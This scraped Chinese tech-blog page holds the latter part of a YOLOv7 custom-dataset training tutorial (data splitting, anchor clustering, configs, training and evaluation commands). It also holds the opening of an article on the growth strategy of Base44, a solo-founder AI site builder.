<span class="hljs-attr">dst_train_label_dir</span> = <span class="hljs-string">"data/custom/labels/train"</span>  <span class="hljs-comment"># 训练集标签目录</span>
<span class="hljs-attr">dst_val_img_dir</span> = <span class="hljs-string">"data/custom/images/val"</span>  <span class="hljs-comment"># 验证集图像目录</span>
<span class="hljs-attr">dst_val_label_dir</span> = <span class="hljs-string">"data/custom/labels/val"</span>  <span class="hljs-comment"># 验证集标签目录</span>
<span class="hljs-attr">val_ratio</span> = <span class="hljs-number">0.2</span>  <span class="hljs-comment"># 验证集比例</span>

<span class="hljs-comment"># 创建目标文件夹（若不存在）</span>
os.makedirs(dst_train_img_dir, <span class="hljs-attr">exist_ok</span>=<span class="hljs-literal">True</span>)
os.makedirs(dst_train_label_dir, <span class="hljs-attr">exist_ok</span>=<span class="hljs-literal">True</span>)
os.makedirs(dst_val_img_dir, <span class="hljs-attr">exist_ok</span>=<span class="hljs-literal">True</span>)
os.makedirs(dst_val_label_dir, <span class="hljs-attr">exist_ok</span>=<span class="hljs-literal">True</span>)

<span class="hljs-comment"># 随机划分数据</span>
<span class="hljs-attr">img_files</span> = [f for f in os.listdir(src_img_dir) if f.endswith((<span class="hljs-string">'.jpg'</span>, <span class="hljs-string">'.png'</span>))]
random.shuffle(img_files)  <span class="hljs-comment"># 打乱顺序，保证随机性</span>
<span class="hljs-attr">val_num</span> = int(len(img_files) * val_ratio)
<span class="hljs-attr">val_files</span> = img_files[:val_num]
<span class="hljs-attr">train_files</span> = img_files[val_num:]

<span class="hljs-comment"># 复制训练集数据</span>
for f in train_files:
    <span class="hljs-attr">src_img</span> = os.path.join(src_img_dir, f)
    <span class="hljs-attr">dst_img</span> = os.path.join(dst_train_img_dir, f)
    shutil.copy(src_img, dst_img)
    <span class="hljs-attr">src_label</span> = os.path.join(src_label_dir, os.path.splitext(f)[<span class="hljs-number">0</span>] + <span class="hljs-string">".txt"</span>)
    <span class="hljs-attr">dst_label</span> = os.path.join(dst_train_label_dir, os.path.splitext(f)[<span class="hljs-number">0</span>] + <span class="hljs-string">".txt"</span>)
    shutil.copy(src_label, dst_label)

<span class="hljs-comment"># 复制验证集数据</span>
for f in val_files:
    <span class="hljs-attr">src_img</span> = os.path.join(src_img_dir, f)
    <span class="hljs-attr">dst_img</span> = os.path.join(dst_val_img_dir, f)
    shutil.copy(src_img, dst_img)
    <span class="hljs-attr">src_label</span> = os.path.join(src_label_dir, os.path.splitext(f)[<span class="hljs-number">0</span>] + <span class="hljs-string">".txt"</span>)
    <span class="hljs-attr">dst_label</span> = os.path.join(dst_val_label_dir, os.path.splitext(f)[<span class="hljs-number">0</span>] + <span class="hljs-string">".txt"</span>)
    shutil.copy(src_label, dst_label)

print(f"划分完成：训练集{len(train_files)}张，验证集{len(val_files)}张")
</code></pre>
<h3 data-id="heading-6">2.2 数据增强：提升模型泛化能力</h3>
<p>新手无需自定义增强逻辑，直接使用YOLOv7原生支持的增强策略，在训练命令中启用即可，避免过度增强破坏目标：</p>
<ul>
<li><strong>基础增强（必选）</strong> ：随机翻转（flip）、随机裁剪（crop）、色域变换（hsv_h、hsv_s、hsv_v），YOLOv7默认启用，无需额外配置；</li>
<li><strong>新手避坑</strong>：不建议开启极端增强（如random_perspective的degrees设置＞30），避免目标被裁剪或变形，导致模型学不到有效特征；</li>
<li><strong>小数据集增强</strong>：若数据集＜500张，可添加“--augment”参数启用额外增强（如Mosaic增强），提升数据多样性。</li>
</ul>
<h3 data-id="heading-7">2.3 锚框聚类：适配自定义目标尺寸</h3>
<p>YOLO模型的默认锚框是为COCO数据集设计的，若自定义数据集目标尺寸差异较大，需重新聚类锚框，否则会导致训练收敛慢、精度低。使用以下代码聚类：</p>
<pre><code class="hljs language-ini" lang="ini">import numpy as np
import glob
from sklearn.cluster import KMeans

<span class="hljs-comment"># 配置路径</span>
<span class="hljs-attr">label_dir</span> = <span class="hljs-string">"data/custom/labels/train"</span>
<span class="hljs-attr">num_anchors</span> = <span class="hljs-number">9</span>  <span class="hljs-comment"># YOLOv7需要9个锚框（3层×3个）</span>

def load_target_sizes(label_dir):
    <span class="hljs-attr">target_sizes</span> = []
    <span class="hljs-attr">label_paths</span> = glob.glob(os.path.join(label_dir, <span class="hljs-string">"*.txt"</span>))
    for path in label_paths:
        with open(path, 'r') as f:
            <span class="hljs-attr">lines</span> = f.readlines()
            for line in lines:
                <span class="hljs-attr">parts</span> = line.strip().split()
                <span class="hljs-attr">w</span> = float(parts[<span class="hljs-number">3</span>])
                <span class="hljs-attr">h</span> = float(parts[<span class="hljs-number">4</span>])
                target_sizes.append(<span class="hljs-section">[w, h]</span>)
    return np.array(target_sizes)

def cluster_anchors(target_sizes, num_anchors):
    <span class="hljs-attr">kmeans</span> = KMeans(n_clusters=num_anchors, random_state=<span class="hljs-number">0</span>).fit(target_sizes)
    <span class="hljs-attr">anchors</span> = kmeans.cluster_centers_
    <span class="hljs-comment"># 按面积排序，分成3组（对应3个检测层）</span>
    <span class="hljs-attr">anchors</span> = sorted(anchors, key=lambda x: x[<span class="hljs-number">0</span>]*x[<span class="hljs-number">1</span>])
    <span class="hljs-attr">anchors</span> = np.array(anchors).reshape(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>)
    return anchors

if <span class="hljs-attr">__name__</span> == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-attr">target_sizes</span> = load_target_sizes(label_dir)
    <span class="hljs-attr">anchors</span> = cluster_anchors(target_sizes, num_anchors)
    print("聚类得到的锚框（按检测层分组）：")
    print(anchors)
    <span class="hljs-comment"># 示例输出（需替换到网络配置文件中）：</span>
    <span class="hljs-comment"># [[[0.05, 0.08], [0.09, 0.12], [0.13, 0.18]],</span>
    <span class="hljs-comment">#  [[0.20, 0.25], [0.28, 0.35], [0.40, 0.45]],</span>
    <span class="hljs-comment">#  [[0.50, 0.60], [0.70, 0.80], [0.90, 1.00]]]</span>
</code></pre>
<h2 data-id="heading-8">三、网络配置与超参数：新手不踩坑的核心设置</h2>
<p>网络配置和超参数错误是训练不收敛的主要原因之一。本节聚焦“网络配置修改→超参数适配”，提供新手友好的配置方案。</p>
<h3 data-id="heading-9">3.1 网络配置文件修改</h3>
<p>复制YOLOv7官方配置文件“cfg/training/yolov7.yaml”，重命名为“yolov7-custom.yaml”，按以下步骤修改：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># parameters</span>
<span class="hljs-attr">nc:</span> <span class="hljs-number">2</span>  <span class="hljs-comment"># 改为自定义数据集的类别数（核心！）</span>
<span class="hljs-attr">depth_multiple:</span> <span class="hljs-number">1.0</span>  <span class="hljs-comment"># 模型深度系数（新手保持默认）</span>
<span class="hljs-attr">width_multiple:</span> <span class="hljs-number">1.0</span>  <span class="hljs-comment"># 通道宽度系数（新手保持默认）</span>

<span class="hljs-comment"># anchors：替换为2.3节聚类得到的锚框</span>
<span class="hljs-attr">anchors:</span>
  <span class="hljs-bullet">-</span> [<span class="hljs-number">0.05</span>, <span class="hljs-number">0.08</span>, <span class="hljs-number">0.09</span>, <span class="hljs-number">0.12</span>, <span class="hljs-number">0.13</span>, <span class="hljs-number">0.18</span>]  <span class="hljs-comment"># P3/8（对应小目标）</span>
  <span class="hljs-bullet">-</span> [<span class="hljs-number">0.20</span>, <span class="hljs-number">0.25</span>, <span class="hljs-number">0.28</span>, <span class="hljs-number">0.35</span>, <span class="hljs-number">0.40</span>, <span class="hljs-number">0.45</span>]  <span class="hljs-comment"># P4/16（对应中目标）</span>
  <span class="hljs-bullet">-</span> [<span class="hljs-number">0.50</span>, <span class="hljs-number">0.60</span>, <span class="hljs-number">0.70</span>, <span class="hljs-number">0.80</span>, <span class="hljs-number">0.90</span>, <span class="hljs-number">1.00</span>]  <span class="hljs-comment"># P5/32（对应大目标）</span>

<span class="hljs-comment"># 其他配置保持默认（新手无需修改）</span>
</code></pre>
<h3 data-id="heading-10">3.2 数据集配置文件创建</h3>
<p>在“data/custom/”目录下创建“data.yaml”文件，指定数据集路径和类别信息：</p>
<pre><code class="hljs language-bash" lang="bash">train: ../custom/images/train  <span class="hljs-comment"># 训练集图像路径（相对YOLOv7源码根目录）</span>
val: ../custom/images/val      <span class="hljs-comment"># 验证集图像路径</span>
nc: 2                          <span class="hljs-comment"># 类别数（与网络配置文件一致）</span>
names: [<span class="hljs-string">'car'</span>, <span class="hljs-string">'person'</span>]       <span class="hljs-comment"># 类别名称（按编号0、1顺序排列）</span>
</code></pre>
<h3 data-id="heading-11">3.3 超参数适配：按GPU显存调整</h3>
<p>YOLOv7官方超参数基于batch_size=64设计，新手需按自己的GPU显存调整，核心遵循“batch_size减半，学习率减半”原则：</p>
<ul>
<li>
<p><strong>学习率配置</strong>：修改“data/hyp.scratch.yaml”中的“lr0”参数：</p>
<ul>
<li>单卡24G显存（batch_size=64）：lr0=0.01（默认）；</li>
<li>单卡16G显存（batch_size=32）：lr0=0.005；</li>
<li>单卡8G显存（batch_size=16）：lr0=0.0025；</li>
<li>单卡4G显存（batch_size=8）：lr0=0.00125。</li>
</ul>
</li>
<li>
<p><strong>梯度累积</strong>：若显存不足，添加“--accumulate n”参数等价增大batch_size（如batch_size=8，accumulate=2等价于16）；</p>
</li>
<li>
<p><strong>新手避坑</strong>：不要使用过小的学习率（如＜0.0001），会导致Loss下降极慢；也不要使用过大的学习率（如＞0.01），会导致Loss震荡不收敛。</p>
</li>
</ul>
<h2 data-id="heading-12">四、模型训练与监控：实时掌握训练状态</h2>
<p>完成以上配置后，执行训练命令并实时监控，及时发现训练异常（如不收敛、过拟合）。</p>
<h3 data-id="heading-13">4.1 训练命令（新手推荐）</h3>
<pre><code class="hljs language-css" lang="css"># 单卡训练（适配<span class="hljs-number">8</span>G显存，batch_size=<span class="hljs-number">16</span>，accumulate=<span class="hljs-number">2</span>等价于<span class="hljs-number">32</span>）
python train<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--weights</span> yolov7<span class="hljs-selector-class">.pt</span> <span class="hljs-attr">--cfg</span> cfg/training/yolov7-custom<span class="hljs-selector-class">.yaml</span> <span class="hljs-attr">--data</span> data/custom/data<span class="hljs-selector-class">.yaml</span> <span class="hljs-attr">--epochs</span> <span class="hljs-number">100</span> <span class="hljs-attr">--batch-size</span> <span class="hljs-number">16</span> <span class="hljs-attr">--accumulate</span> <span class="hljs-number">2</span> <span class="hljs-attr">--device</span> <span class="hljs-number">0</span> <span class="hljs-attr">--name</span> yolov7_custom_train <span class="hljs-attr">--cache</span>

# 参数说明：
# <span class="hljs-attr">--weights</span> yolov7<span class="hljs-selector-class">.pt</span>：加载官方预训练权重（核心！避免从头训练）
# <span class="hljs-attr">--cfg</span>：自定义网络配置文件路径
# <span class="hljs-attr">--data</span>：数据集配置文件路径
# <span class="hljs-attr">--epochs</span> <span class="hljs-number">100</span>：训练轮数（新手足够观察收敛趋势）
# <span class="hljs-attr">--device</span> <span class="hljs-number">0</span>：使用第<span class="hljs-number">0</span>块GPU
# <span class="hljs-attr">--name</span>：训练日志保存名称
# <span class="hljs-attr">--cache</span>：缓存数据到内存，加速训练
</code></pre>
<h3 data-id="heading-14">4.2 训练过程监控：3个关键指标</h3>
<p>训练时实时观察以下指标，判断训练是否正常：</p>
<ol>
<li><strong>Loss曲线</strong>：前10个epoch，train_loss应快速下降（如从10+降到2以下）；50epoch后趋于平稳，val_loss与train_loss差距≤0.5（差距过大则过拟合）；</li>
<li><strong>精度指标</strong>：30epoch后，mAP50、mAP50-95应逐步上升，最终稳定在一个区间（无“精度为0”或断崖式下降）；</li>
<li><strong>可视化监控</strong>：启用TensorBoard查看曲线： <code>tensorboard --logdir runs/train/yolov7_custom_train</code></li>
</ol>
<h3 data-id="heading-15">4.3 中断训练恢复</h3>
<p>若训练中断，通过以下命令恢复训练（无需从头开始）：</p>
<pre><code class="hljs language-bash" lang="bash">python train.py --resume runs/train/yolov7_custom_train/weights/last.pt
</code></pre>
<h2 data-id="heading-16">五、模型评估：从指标到可视化，全面验证模型性能</h2>
<p>训练完成后，需通过“量化指标+可视化结果”全面评估模型性能，判断是否满足实际需求。</p>
<h3 data-id="heading-17">5.1 核心评估指标解读</h3>
<p>YOLOv7训练完成后，会自动生成评估报告，核心指标解读如下：</p>
<ul>
<li><strong>mAP50</strong>：IOU阈值为0.5时的平均精度（核心指标），越高说明模型检测准确率越高（工业场景一般要求≥0.7）；</li>
<li><strong>mAP50-95</strong>：IOU阈值从0.5到0.95的平均精度，更全面反映模型性能；</li>
<li><strong>P（Precision）</strong> ：精确率（预测为正的样本中实际为正的比例），越高说明误检越少；</li>
<li><strong>R（Recall）</strong> ：召回率（实际为正的样本中被预测为正的比例），越高说明漏检越少；</li>
<li><strong>F1-score</strong>：P和R的调和平均，综合反映模型精确率和召回率。</li>
</ul>
<h3 data-id="heading-18">5.2 手动评估与结果可视化</h3>
<p>使用以下命令手动生成详细评估报告，并可视化预测结果：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 生成详细评估报告（包含各类别指标）</span>
python val.py --weights runs/train/yolov7_custom_train/weights/best.pt --data data/custom/data.yaml --task val --device 0

<span class="hljs-comment"># 2. 可视化预测结果（保存到runs/detect目录）</span>
python detect.py --weights runs/train/yolov7_custom_train/weights/best.pt --<span class="hljs-built_in">source</span> data/custom/images/val --save-txt --save-conf

<span class="hljs-comment"># 参数说明：</span>
<span class="hljs-comment"># --source：待检测图像/视频路径（可填文件夹、单张图像、视频文件）</span>
<span class="hljs-comment"># --save-txt：保存预测框坐标（txt格式）</span>
<span class="hljs-comment"># --save-conf：保存预测置信度</span>
</code></pre>
<h3 data-id="heading-19">5.3 模型优化：针对弱指标调整</h3>
<p>若评估指标不达标，按以下方向优化：</p>
<ul>
<li><strong>小目标漏检（小目标AP低）</strong> ：增大输入图像尺寸（--img 800）、优化小目标锚框、增加小目标样本；</li>
<li><strong>误检多（Precision低）</strong> ：提高预测置信度阈值（detect.py中--conf 0.5）、增加难例样本训练；</li>
<li><strong>过拟合（train_loss低，val_loss高）</strong> ：减少数据增强强度、增加正则化（修改hyp.scratch.yaml中的weight_decay）、增加训练数据量。</li>
</ul>
<h2 data-id="heading-20">六、全流程避坑清单：新手快速排错指南</h2>
<p>总结全工作流15个高频坑，按“标注→预处理→训练→评估”分类，遇到问题时可直接对照排查：</p>
<h3 data-id="heading-21">6.1 标注阶段避坑</h3>
<ol>
<li>标注格式未选YOLO，导致坐标非归一化→ 标注前确认LabelImg格式为“YOLO”；</li>
<li>类别编号从1开始（非0）→ 统一从0开始连续编号；</li>
<li>txt文件名与图像文件名不匹配→ 用1.3节代码校验；</li>
<li>标注框未完全包围目标→ 放大图像精细标注。</li>
</ol>
<h3 data-id="heading-22">6.2 预处理阶段避坑</h3>
<ol>
<li>训练集与验证集分布差异大→ 确保两组数据包含相同场景、相同尺度目标；</li>
<li>未聚类锚框，直接使用默认值→ 自定义数据集必须重新聚类锚框；</li>
<li>数据增强过度，目标被破坏→ 关闭极端增强，使用默认增强参数。</li>
</ol>
<h3 data-id="heading-23">6.3 训练阶段避坑</h3>
<ol>
<li>未使用预训练权重，从头训练→ 必须加载官方yolov7.pt；</li>
<li>网络配置文件nc与实际类别数不一致→ 确保nc等于自定义类别数；</li>
<li>学习率与batch_size不匹配→ 按3.3节适配学习率；</li>
<li>GPU显存不足导致训练中断→ 减小batch_size，启用梯度累积；</li>
<li>训练Loss始终＞5→ 检查标注格式、网络配置、学习率。</li>
</ol>
<h3 data-id="heading-24">6.4 评估阶段避坑</h3>
<ol>
<li>评估时使用错误的数据集→ 确保val.py中--data指向正确的data.yaml；</li>
<li>误将训练集当作验证集评估→ 严格区分train/val目录；</li>
<li>可视化结果无预测框→ 检查模型权重路径、置信度阈值（--conf）。</li>
</ol>
<h2 data-id="heading-25">七、总结：从数据到模型的闭环逻辑</h2>
<p>YOLO目标检测的完整工作流核心是“数据→配置→训练→评估→优化”的闭环：高质量标注是基础，科学预处理是前提，合理配置是关键，实时监控是保障，精准评估与优化是提升模型性能的核心。</p>
<p>新手无需追求复杂的自定义修改，先按本文流程打通全链路，再针对具体问题（如小目标检测、复杂场景适配）逐步优化。按此流程操作，可快速从新手成长为能独立完成YOLO目标检测项目的工程师。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[1 个人用AI编程开发的产品卖了8000万美金——Base44的增长策略全拆解]]></title>    <link>https://juejin.cn/post/7572459757107920950</link>    <guid>https://juejin.cn/post/7572459757107920950</guid>    <pubDate>2025-11-16T03:20:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7572459757107920950" data-draft-id="7572459757107904566" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="1 个人用AI编程开发的产品卖了8000万美金——Base44的增长策略全拆解"/> <meta itemprop="keywords" content="AI编程,人工智能"/> <meta itemprop="datePublished" content="2025-11-16T03:20:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="饼干哥哥"/> <meta itemprop="url" content="https://juejin.cn/user/2001569972490973"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            1 个人用AI编程开发的产品卖了8000万美金——Base44的增长策略全拆解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2001569972490973/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    饼干哥哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-16T03:20:59.000Z" title="Sun Nov 16 2025 03:20:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    134
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>上一期我分享了一人独角兽公司榜单：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FuP1JhBeFVwuOYnwosVSnfg" target="_blank" title="https://mp.weixin.qq.com/s/uP1JhBeFVwuOYnwosVSnfg" ref="nofollow noopener noreferrer">建议AI创业者都关注这个「一人独角兽」公司榜单</a></p>
<p>里面提到一个「真·1 人公司」半年搞到 8000 万美元的离谱事迹，它就是 base44.com</p>
<p>饼干哥哥把他<strong>从 0 到被收购的完整链路都搜刮出来，并整理到了一个 html 里</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd923bbba0b94100b2291f104156f6a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768707160&amp;x-signature=6RAHxRqmTkvrDPf53j039p4C7B8%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/32aca72c3c1d499a82ed4801d0626158~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768707160&amp;x-signature=BTfZLhccOqaXnT7gaVIFwqrQF8M%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/128d5ed042894f8fb54bc8c9bd37601e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768707160&amp;x-signature=z8paByNvvxNoV5aOV8rWJtR0sqk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49d9743339b94b74be60d21b340b734f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768707160&amp;x-signature=%2F31P4p0ILauVNfsVnHxcmrJPec4%3D" alt="" loading="lazy"/></p>
<p>我把HTML文件 入口放到了<strong>文末</strong>。</p>
<p>建议先看完我对 Base44 的增长复盘。</p>
<p>2025年，只有一个创始人、零融资、半年上线就盈利、最终以8000万美金被 Wix 全资收购的 Base44，把极简创业和极致增长的样板推到了所有产品人和创业者面前。</p>
<p>base44是AI建站工具，但定位的是「非程序员」，<strong>往下看你就知道为什么它能在产品、营销等全方位胜过 lovable、Cursor等知名AI 编程工具。</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a4a3fcde9cf4218ba6d5aa65b0d7840~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768707160&amp;x-signature=t93abbMqLMpsDpfh1q7TmeHBp1w%3D" alt="" loading="lazy"/></p>
<p>复盘下来，创始人做了 5个关键决策。</p>
<p><strong>Part 1 破局：从“公开构建”到AI赋能的极致精简</strong></p>
<p>Base44的创始人Maor Shlomo，并非什么背景显赫的连续创业者，他只是一位普通的工程师。</p>
<p><strong>关键决策一：Building in Public（公开构建）</strong></p>
<p>这个产品的起点是他女朋友抱怨开发一个网站很难，于是他就萌生了这个产品的想法。</p>
<p>但他并没有一开始就埋头苦干，而是先发了一条推特，向世界宣告我要搭建这个产品，并且以后我会把所有的开发过程都公开，邀请大家一起见证 base44 的成长。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/534fc7a25ac647a182fbf8b10997d4b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768707160&amp;x-signature=INYZGbGpXlgQ9cS4gPrNKptoogQ%3D" alt="" loading="lazy"/></p>
<p>听着是不是很奇怪，程序员不去干活，跑去发推特干嘛？</p>
<p>其实这是目前最流行的一种开发模式，叫<strong>build in public</strong></p>
<p>它完全颠覆了以往传统企业对自己商机想法高度保密的方式，而是把开发和运营进程等信息公开，甚至连利润都发出来。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c260f1d610e449ba331a303a4f4f4dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768707160&amp;x-signature=RU8UfZ15nWHXU1QsQuiNy%2BWSQlI%3D" alt="" loading="lazy"/></p>
<p>这样做的好处是能吸引很多围观群众，热度上来之后，能吸引懂行的网友帮他出主意，很多种子用户也因为看到了创始人极致真实的过程而转化为忠实粉丝。</p>
<p>同时还能为产品快速完成冷启动，而这些都是免费的。</p>
<p><strong>关键决策二：AI辅助开发，极致精简组织</strong></p>
<p>从2024年11月到12月，Maor始终坚持“单人独行”。他利用Claude等AI工具辅助开发，甚至做到“三个月没写过一行前端代码”。</p>
<p><strong>在产品早期，追求“快”是核心。</strong></p>
<p>AI作为“超级杠杆”，让Maor得以一人完成传统团队才能完成的工作量。这种极致的精简，保证了极快的迭代速度和极低的运营成本，让Base44能够灵活应对市场变化，并将精力聚焦在核心产品价值上。</p>
<p><strong>Part 2 飞轮：用户反馈驱动的极致迭代</strong></p>
<p>高频小步快跑，是 Base44 能维持极致用户粘性和口碑的最大护城河。</p>
<p><strong>关键决策三：真人可用性测试，快速验证迭代</strong></p>
<p>刚开始，Maor 找了3个朋友，几乎每天都让他们用产品，自己就坐在旁边观察，每天晚上修 bug、改体验。</p>
